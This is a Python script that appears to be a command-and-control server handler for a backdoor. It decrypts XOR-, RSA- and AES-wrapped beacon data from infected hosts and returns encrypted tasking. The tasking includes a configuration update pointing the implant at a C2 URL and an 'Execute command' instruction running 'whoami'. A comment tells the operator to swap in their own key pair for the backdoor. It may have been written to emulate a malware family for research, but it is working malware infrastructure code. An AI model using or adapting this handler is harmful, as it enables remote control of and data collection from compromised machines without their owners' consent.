import socket
import io
import struct
from binascii import hexlify
import sys
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_v1_5, AES
from base64 import b64decode
from Cryptodome.Util.Padding import pad, unpad


# Generate your own RSA-2048 key pair, don't forget to replace public key in backdoor 
private_key = """PRIVATEKEYGOESHERE"""

def xor_value(value, key):
    encrypted_text = b''
    for i in range(len(value)):
        val = value[i] ^ key[i%len(key)]
        encrypted_text += bytes([val])
    return encrypted_text


def decrypt_rsa(encrypted_data, key):
    rsa_key = RSA.importKey(key)
    rsakey = PKCS1_v1_5.new(rsa_key)
    data = encrypted_data
    return rsakey.decrypt(data[::-1], None)


def encrypt_aes(data, key):
    iv = b'\x00'*16
    cipher = AES.new(
        key,
     AES.MODE_CBC,
     IV=iv)
    return cipher.encrypt(pad(data,AES.block_size))


def decrypt_aes(encrypted_data, key):
    iv = b'\x00'*16
    cipher = AES.new(
        key,
     AES.MODE_CBC,
     IV=iv)
    return unpad(cipher.decrypt(encrypted_data), AES.block_size).decode('utf-16le')


def handle_response(data):
    sio = io.BytesIO(data)
    xor_key = sio.read(4)
    rest_output = sio.read()
    rest_output_xored = xor_value(rest_output, xor_key)
    sio = io.BytesIO(rest_output_xored)

    big_endian_encrypted_key_length = sio.read(4)
    encrypted_key_length = struct.unpack(">I", big_endian_encrypted_key_length)[0]
    encrypted_key = sio.read(encrypted_key_length)
    decrypted_key = decrypt_rsa(encrypted_key, private_key)

    big_endian_encrypted_data_length = sio.read(4)
    encrypted_data_length = struct.unpack(">I", big_endian_encrypted_data_length)[0]
    encrypted_data = sio.read(encrypted_data_length)
    decrypted_data = decrypt_aes(encrypted_data,decrypted_key)

    return decrypted_key, decrypted_data

def HandleRequest(req, method, post_data=None):
    """
    Request format
        <4-byte XOR key><BE-EncryptedKeyLength><EncryptedKey><BE-EncryptedDataLength><EncryptedData><RandomData>

        Logic:
            Extract XOR key from first 4 bytes
                XOR rest of response
                    Next 4 bytes indicate length of encrypted key
                        Extract next n bytes
                            Decrypt via private key
                                Next 4 bytes indicate length of encrypted data
                                    Extract next n bytes
                                        Decrypt via decrypted key
                                            Log raw data
    Response:
        Use same decrypted key to encrypt response
        Response format
            Update configuration
                Example:
                    {\"GafpPS\": {\"LsHsAO\": [\"https://127.0.0.1/news/article\"], \"hM4cDc\": 5, \"nLMNzt\": 10}}
                    {\"Td7opP\": [{\"J8yWIG\": \"Execute command\", \"CwbJ4E\": 5, \"XVXLNm\": \"whoami\", \"INlB5X\":\"\"}]}
            Execute backdoor command                                                                                                                                            

    """

    response_config_update = '{\"GafpPS\": {\"LsHsAO\": [\"https://133.133.133.133/doot/article\"], \"hM4cDc\": 3, \"nLMNzt\": 10}}'
    response_execute_command = '{\"Td7opP\": [{\"J8yWIG\": \"Execute command\", \"CwbJ4E\": 5, \"XVXLNm\": \"whoami\", \"INlB5X\":\"\"}]}'
    response = response_config_update
    decrypted_key, decrypted_data = handle_response(post_data)
    print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
    print('Decrypted data blob: ')
    print(decrypted_data)
    print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
    print('Sending encrypted response: ')
    print(response)
    print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
    response = encrypt_aes(response.encode('utf-16le'),decrypted_key)
    req.send_response(200)
    req.send_header('Content-Length', len(response))
    req.end_headers()
    req.wfile.write(response)